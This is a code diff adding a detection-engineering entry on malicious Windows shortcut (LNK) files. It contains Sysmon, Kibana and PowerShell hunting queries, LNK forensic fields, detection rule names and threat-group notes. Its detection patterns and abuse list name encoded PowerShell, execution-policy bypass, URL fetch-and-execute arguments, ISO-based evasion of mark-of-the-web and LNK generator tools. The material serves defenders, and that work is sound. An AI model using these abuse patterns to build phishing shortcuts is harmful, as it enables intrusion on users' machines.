+        sysmon: `// Sysmon does not directly parse LNK file content,
+// but catches the execution that LNK launches:
+
+EventID=1
+ParentImage=*\\explorer.exe
+CommandLine matches:
+  *cmd.exe* OR *powershell.exe*
+  OR *wscript.exe* OR *cscript.exe*
+  OR *mshta.exe* OR *rundll32.exe*
+AND CommandLine contains suspicious arguments:
+  -ExecutionPolicy Bypass
+  -EncodedCommand
+  -WindowStyle Hidden
+  vbscript: OR javascript:
+  http:// OR https://
+  AppData OR Temp OR ProgramData
+
+// Supplementary - LNK file write events (EID 11):
+EventID=11
+TargetFilename=*.lnk
+TargetFilename path matches user-writable location`,
+        kibana: `// Suspicious process spawned by explorer with risk args
+winlog.event_id: 1
+AND process.parent.name: "explorer.exe"
+AND process.name: ("cmd.exe" OR "powershell.exe" OR "wscript.exe" OR "cscript.exe" OR "mshta.exe" OR "rundll32.exe")
+AND process.command_line: (*ExecutionPolicy*Bypass* OR *EncodedCommand* OR *WindowStyle*Hidden* OR *vbscript\:* OR *javascript\:* OR *http\:\/\/* OR *https\:\/\/*)
+
+// Supplementary: LNK files created in user-writable paths
+winlog.event_id: 11
+AND file.extension: "lnk"
+AND file.path: (*\\AppData\\* OR *\\Temp\\* OR *\\Downloads\\* OR *\\Desktop\\*)`,
+        powershell: `# Hunt for suspicious interpreter execution from explorer parent
+Get-WinEvent -FilterHashtable @{
+  LogName='Microsoft-Windows-Sysmon/Operational';
+  ID=1
+} | Where-Object {
+  $_.Properties[20].Value -match 'explorer\.exe' -and
+  $_.Properties[4].Value -match
+    '(cmd|powershell|wscript|cscript|mshta|rundll32)\.exe$' -and
+  $_.Properties[10].Value -match
+    '(ExecutionPolicy.*Bypass|EncodedCommand|WindowStyle.*Hidden|vbscript:|javascript:|http://|https://|AppData|Temp|ProgramData)'
+} | Select TimeCreated,
+  @{n='Image';e={($_.Properties[4].Value -split '\\\\')[-1]}},
+  @{n='CmdLine';e={$_.Properties[10].Value}},
+  @{n='User';e={$_.Properties[12].Value}} |
+  Sort-Object TimeCreated -Descending
+
+# Parse LNK files in user paths (analyze-on-disk approach)
+# Useful for live host triage of recent phishing artifacts
+Get-ChildItem -Path \$env:USERPROFILE -Recurse -Filter *.lnk \`
+  -ErrorAction SilentlyContinue |
+  ForEach-Object {
+    $shell = New-Object -ComObject WScript.Shell
+    $lnk = $shell.CreateShortcut($_.FullName)
+    if ($lnk.TargetPath -match
+      '(cmd|powershell|wscript|cscript|mshta|rundll32)' -or
+      $lnk.Arguments -match
+        '(ExecutionPolicy|EncodedCommand|vbscript:|javascript:|http)') {
+      [PSCustomObject]@{
+        LnkFile     = $_.FullName
+        TargetPath  = $lnk.TargetPath
+        Arguments   = $lnk.Arguments
+        WorkingDir  = $lnk.WorkingDirectory
+        Description = $lnk.Description
+        IconPath    = $lnk.IconLocation
+      }
+    }
+  }`,
+        registry: `LNK file structure (binary format):
+- Inspect with LECmd (Eric Zimmerman tool) or
+  PowerShell WScript.Shell COM object
+- Key fields:
+  - TargetPath: the actual binary launched
+  - Arguments: command-line arguments passed
+  - WorkingDirectory: where the target runs from
+  - IconLocation: often spoofed (document icon
+    on a cmd-launching LNK)
+  - Description: tooltip text (often blank for
+    adversary LNKs, or contains lure text)
+
+Recent files cache:
+- %APPDATA%\\Roaming\\Microsoft\\Windows\\Recent\\
+- Windows creates LNK files here automatically
+  when documents are opened - useful for showing
+  what user actually opened during incident
+
+LNK forensic timestamps:
+- LNK files contain three sets of timestamps:
+  - LNK file's own MACB timestamps (filesystem)
+  - Target file's MACB timestamps (embedded in LNK)
+  - Last accessed time (when user opened the LNK)
+- These can reveal staging timelines
+
+Zone.Identifier on LNK:
+- LNKs delivered via email/web have MOTW
+- LNKs inside ISO containers do NOT have MOTW
+  (key reason ISO+LNK is the modern delivery chain)`,
+        tools: `LNK abuse patterns:
+- Document-icon LNK pointing to powershell.exe with
+  -EncodedCommand argument
+- LNK pointing to cmd.exe /c with chained payload
+- LNK with WorkingDirectory in suspicious path
+- LNK with Arguments containing URL (fetch + execute)
+- LNK with very long argument string truncated in
+  Explorer's tooltip (intentional UI evasion)
+
+LNK generation:
+- mklink (built-in Windows command)
+- New-Object -ComObject WScript.Shell + CreateShortcut
+  (PowerShell - heavily used by adversaries)
+- Custom LNK generators (LNKUp, etc.)
+- Cobalt Strike artifact kit includes LNK generation
+
+LNK forensic tools:
+- LECmd (Eric Zimmerman): LNK file analyzer
+- Windows-LnkFile-DB: parsed LNK reference data
+- KAPE: includes LNK collection targets
+
+Delivery context:
+- Inside ZIP attachments (most common phishing path)
+- Inside ISO/IMG containers (post-MOTW evasion)
+- Inside OneNote .one files
+- Standalone .lnk in email (rarer - many mail
+  gateways block .lnk attachments)`,
+        ossdetect: `Sigma:
+- proc_creation_win_lnk_susp_target.yml
+- proc_creation_win_susp_explorer_child.yml
+- file_event_win_lnk_creation_susp_location.yml
+
+Atomic Red Team:
+- T1204.002 (user execution tests)
+- T1547.009 (Shortcut Modification - LNK persistence)
+
+Hayabusa:
+- SuspExplorerChildWithRiskyArgs rules
+- LnkLaunchingInterpreter detection
+
+Velociraptor:
+- Windows.Forensics.Lnk (LNK file parser)
+- Windows.EventLogs.Sysmon
+- Windows.System.RecentFileCache
+
+LECmd by Eric Zimmerman:
+- Standalone LNK file analyzer
+- Parses all LNK fields including hidden ones
+- Free tool, essential for LNK forensic work`,
+        notes: "LNK files are the connective tissue of modern phishing delivery chains - particularly in ISO containers where the LNK provides the user-clickable interface while the actual payload (often a script or DLL) sits hidden in the same container. The detection focuses on the execution artifact rather than the LNK file itself: when a user double-clicks a malicious LNK, Sysmon EID 1 captures the resulting process spawn with explorer.exe as the parent and the LNK's target+arguments visible in the new process's command line. This is why the explorer.exe parent context combined with risky command-line arguments (ExecutionPolicy Bypass, EncodedCommand, vbscript:, URL fetches, suspicious paths) is so high-fidelity. The live-host LNK enumeration PowerShell script is useful for IR triage: it parses every LNK in the user profile and flags ones with suspicious targets/arguments. False positives: some legitimate software ships .lnk files in user paths (Quick Launch, custom shortcuts created by installers), and developer workflows sometimes involve LNK files with command-line arguments - context matters. The strongest single signal is a LNK file in Downloads, Desktop, or a temp ZIP extraction directory with a TargetPath of cmd/powershell/wscript and an Arguments field containing payload-like content.",
+        apt: [
+          { cls: "apt-mul", name: "QakBot", note: "ISO + LNK + payload chains are signature QakBot delivery pattern post-2022." },
+          { cls: "apt-mul", name: "Bumblebee", note: "LNK-based execution from ISO containers documented across loader campaigns." },
+          { cls: "apt-cn", name: "Mustang Panda", note: "LNK-based phishing documented in operations targeting Southeast Asian governments." },
+          { cls: "apt-kp", name: "Lazarus", note: "LNK-based delivery documented in financial sector targeting operations." },
+          { cls: "apt-mul", name: "Commodity Phishing", note: "LNK is the most common single file type in post-MOTW commodity phishing delivery." }
+        ],
+        cite: "MITRE ATT&CK T1204.002, T1566.001"
       }
     ]
   }
